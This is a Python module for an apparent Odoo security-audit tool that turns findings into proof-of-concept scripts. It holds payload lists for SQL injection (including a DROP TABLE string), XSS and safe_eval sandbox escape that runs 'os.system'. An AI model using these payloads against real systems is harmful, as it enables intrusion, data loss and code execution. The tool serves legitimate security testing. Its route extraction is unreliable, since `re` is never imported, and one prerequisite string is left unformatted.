"""Automated PoC Generator - Generates reproduction scripts for Odoo security findings.

Given a finding (file, line, type), generates:
- curl commands for HTTP route-based findings
- Python scripts for ORM-based findings
- XML-RPC/JSON-RPC payloads for RPC findings
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any


@dataclass
class PoC:
    """Represents a generated Proof of Concept."""

    title: str
    finding_id: str
    method: str  # curl, python, xmlrpc, jsonrpc
    script: str
    description: str
    prerequisites: list[str]


class PoCGenerator:
    """Generates reproduction scripts for Odoo security findings."""

    def __init__(self, base_url: str = "http://localhost:8069", database: str = "odoo") -> None:
        self.base_url = base_url.rstrip("/")
        self.database = database

    def generate_for_finding(self, finding: dict[str, Any]) -> PoC | None:
        """Generate a PoC for a specific finding."""
        rule_id = finding.get("rule_id", "")
        file = finding.get("file", "")
        line = finding.get("line", 0)
        title = finding.get("title", "")

        if "public-route" in rule_id or "auth=" in title.lower():
            return self._generate_route_poc(finding)
        elif "sql" in rule_id or "cr.execute" in title.lower():
            return self._generate_sql_poc(finding)
        elif "csrf" in rule_id:
            return self._generate_csrf_poc(finding)
        elif "xss" in rule_id or "t-raw" in title.lower():
            return self._generate_xss_poc(finding)
        elif "safe-eval" in rule_id:
            return self._generate_safe_eval_poc(finding)
        elif "mass-assignment" in rule_id:
            return self._generate_mass_assignment_poc(finding)
        elif "idor" in rule_id:
            return self._generate_idor_poc(finding)
        elif "sudo" in rule_id:
            return self._generate_sudo_poc(finding)

        return None

    def _generate_route_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for route-based findings."""
        route = self._extract_route_from_file(finding.get("file", ""), finding.get("line", 0))
        url = f"{self.base_url}{route}"

        script = f"""#!/usr/bin/env bash
# PoC for: {finding.get('title', '')}
# Route: {route}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

echo "Testing public route..."
curl -s -o /dev/null -w "HTTP Status: %{{http_code}}\\n" \
  -X GET "{url}"

echo ""
echo "With common parameters..."
curl -s -X GET "{url}?debug=1" | head -20
"""

        return PoC(
            title=f"Route PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="curl",
            script=script,
            description=f"Tests public accessibility of route {route}",
            prerequisites=["Target Odoo instance running", "Network access to {self.base_url}"],
        )

    def _generate_sql_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for SQL injection findings."""
        script = f"""#!/usr/bin/env python3
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

import xmlrpc.client

url = "{self.base_url}"
db = "{self.database}"

# Common Odoo SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' UNION SELECT * FROM res_users--",
    "1; DROP TABLE test--",
    "' AND 1=1--",
    "' AND 1=2--",
]

print("SQL Injection PoC")
print("=" * 50)
for payload in payloads:
    print(f"Payload: {{payload}}")
    # Note: Actual exploitation requires understanding the vulnerable endpoint
    print("  [ ] Test manually via the vulnerable route")
    print()

print("Manual testing steps:")
print("1. Identify the vulnerable parameter")
print("2. Submit payload through the UI or API")
print("3. Check for SQL errors or changed behavior")
"""

        return PoC(
            title=f"SQL Injection PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="python",
            script=script,
            description="Provides SQL injection payloads for manual testing",
            prerequisites=["Target Odoo instance", "Knowledge of vulnerable endpoint"],
        )

    def _generate_csrf_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for CSRF findings."""
        route = self._extract_route_from_file(finding.get("file", ""), finding.get("line", 0))
        url = f"{self.base_url}{route}"

        script = f"""\u003c!-- CSRF PoC for: {finding.get('title', '')} --\u003e
\u003c!-- File: {finding.get('file', '')}:{finding.get('line', 0)} --\u003e
\u003chtml\u003e
\u003cbody\u003e
    \u003ch1\u003eCSRF PoC\u003c/h1\u003e
    \u003cp\u003eThis form submits to {route} without CSRF token\u003c/p\u003e
    
    \u003cform action="{url}" method="POST" id="csrf-form"\u003e
        \u003cinput type="hidden" name="field1" value="test" /\u003e
        \u003cinput type="submit" value="Submit" /\u003e
    \u003c/form\u003e
    
    \u003cscript\u003e
        // Auto-submit for testing
        // document.getElementById('csrf-form').submit();
    \u003c/script\u003e
\u003c/body\u003e
\u003c/html\u003e
"""

        return PoC(
            title=f"CSRF PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="html",
            script=script,
            description=f"HTML page that demonstrates CSRF against {route}",
            prerequisites=["Target Odoo instance", "Authenticated session in browser"],
        )

    def _generate_xss_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for XSS findings."""
        script = f"""#!/usr/bin/env bash
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

# Common XSS payloads for Odoo
payloads=(
    "\u003cscript\u003ealert('XSS')\u003c/script\u003e"
    "\u003cimg src=x onerror=alert('XSS')\u003e"
    "\u003ciframe src=javascript:alert('XSS')\u003e"
    "\u003cbody onload=alert('XSS')\u003e"
)

echo "XSS PoC Payloads"
echo "================"
for payload in "${{payloads[@]}}"; do
    echo "Payload: $payload"
done

echo ""
echo "Test via:"
echo "1. Find input field that renders without escaping"
echo "2. Submit payload"
echo "3. Check for alert box or script execution"
"""

        return PoC(
            title=f"XSS PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="bash",
            script=script,
            description="Provides XSS payloads for manual testing",
            prerequisites=["Target Odoo instance", "Input field that renders unsanitized"],
        )

    def _generate_safe_eval_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for safe_eval findings."""
        script = f"""#!/usr/bin/env python3
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

# Common safe_eval bypass payloads
payloads = [
    "().__class__.__bases__[0].__subclasses__()",
    "().__class__.__mro__[1].__subclasses__()",
    "[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'os']",
    "{'__builtins__': __import__('os')}['__builtins__'].system('id')",
]

print("safe_eval Bypass PoC")
print("=" * 50)
for payload in payloads:
    print(f"Payload: {{payload}}")
    print("  [ ] Test via vulnerable endpoint")
    print()

print("Note: Odoo patches safe_eval regularly.")
print("These may not work on patched versions.")
"""

        return PoC(
            title=f"safe_eval PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="python",
            script=script,
            description="Provides safe_eval bypass payloads",
            prerequisites=["Target Odoo instance", "Vulnerable endpoint accepting expressions"],
        )

    def _generate_mass_assignment_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for mass assignment findings."""
        script = f"""#!/usr/bin/env python3
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

import json
import requests

url = "{self.base_url}"

# Mass assignment test payloads
payloads = [
    {{"name": "test", "state": "done", "user_id": 1}},
    {{"name": "test", "active": True, "company_id": 1}},
    {{"name": "test", "__last_update": False}},
]

print("Mass Assignment PoC")
print("=" * 50)
for payload in payloads:
    print(f"Payload: {{json.dumps(payload)}}")
    print("  [ ] Submit via vulnerable endpoint")
    print()

print("Test via JSON-RPC or form submission")
"""

        return PoC(
            title=f"Mass Assignment PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="python",
            script=script,
            description="Provides mass assignment payloads",
            prerequisites=["Target Odoo instance", "Vulnerable endpoint accepting object data"],
        )

    def _generate_idor_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for IDOR findings."""
        script = f"""#!/usr/bin/env bash
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

# IDOR testing: increment IDs and check access
echo "IDOR PoC"
echo "========"

for id in 1 2 3 4 5 10 100; do
    echo "Testing ID: $id"
    # Adjust URL pattern as needed
    # curl -s "{self.base_url}/my/orders/$id" | grep -i "error|not found" || echo "  ACCESSIBLE"
done

echo ""
echo "Also test with other user's IDs"
echo "and check for sequential ID patterns"
"""

        return PoC(
            title=f"IDOR PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="bash",
            script=script,
            description="Tests for Insecure Direct Object Reference",
            prerequisites=["Target Odoo instance", "Authenticated portal user"],
        )

    def _generate_sudo_poc(self, finding: dict[str, Any]) -> PoC:
        """Generate PoC for sudo() findings."""
        script = f"""#!/usr/bin/env python3
# PoC for: {finding.get('title', '')}
# File: {finding.get('file', '')}:{finding.get('line', 0)}

import xmlrpc.client

url = "{self.base_url}"
db = "{self.database}"

# Test if sudo() exposes more data than expected
# This requires understanding the specific model

print("sudo() Data Exposure PoC")
print("=" * 50)
print("1. Access the route as anonymous/public user")
print("2. Compare data with authenticated request")
print("3. Check if sudo() exposes records that shouldn't be visible")
print()
print("Common checks:")
print("- Can you see other users' records?")
print("- Can you see records from other companies?")
print("- Can you see internal/admin-only fields?")
"""

        return PoC(
            title=f"sudo() PoC: {finding.get('title', '')}",
            finding_id=finding.get("id", "unknown"),
            method="python",
            script=script,
            description="Tests for unauthorized data access via sudo()",
            prerequisites=["Target Odoo instance", "Public or low-privilege access"],
        )

    def _extract_route_from_file(self, file_path: str, line: int) -> str:
        """Extract route path from a controller file."""
        try:
            path = Path(file_path)
            if not path.exists():
                return "/unknown"

            content = path.read_text(encoding="utf-8")
            lines = content.splitlines()

            # Look for @http.route near the specified line
            for i in range(max(0, line - 5), min(len(lines), line + 5)):
                match = re.search(r'@http\.route\(["\']([^"\']+)["\']', lines[i])
                if match:
                    return match.group(1)

            return "/unknown"
        except Exception:
            return "/unknown"


def generate_pocs(findings: list[dict[str, Any]], output_dir: Path) -> list[Path]:
    """Generate PoC scripts for a list of findings."""
    generator = PoCGenerator()
    output_dir.mkdir(parents=True, exist_ok=True)
    generated: list[Path] = []

    for finding in findings:
        poc = generator.generate_for_finding(finding)
        if poc:
            # Determine file extension based on method
            extensions = {
                "curl": ".sh",
                "python": ".py",
                "bash": ".sh",
                "html": ".html",
                "xmlrpc": ".py",
                "jsonrpc": ".py",
            }
            ext = extensions.get(poc.method, ".txt")

            filename = f"poc-{poc.finding_id}{ext}"
            filepath = output_dir / filename
            filepath.write_text(poc.script, encoding="utf-8")

            # Make executable if script
            if ext in (".sh", ".py"):
                filepath.chmod(0o755)

            generated.append(filepath)

    return generated


def poc_to_markdown(poc: PoC) -> str:
    """Convert a PoC to Markdown documentation."""
    return f"""## {poc.title}

**Method:** {poc.method}
**Finding:** {poc.finding_id}

{poc.description}

### Prerequisites

{chr(10).join(f"- {p}" for p in poc.prerequisites)}

### Script

```{poc.method}
{poc.script}
```
"""
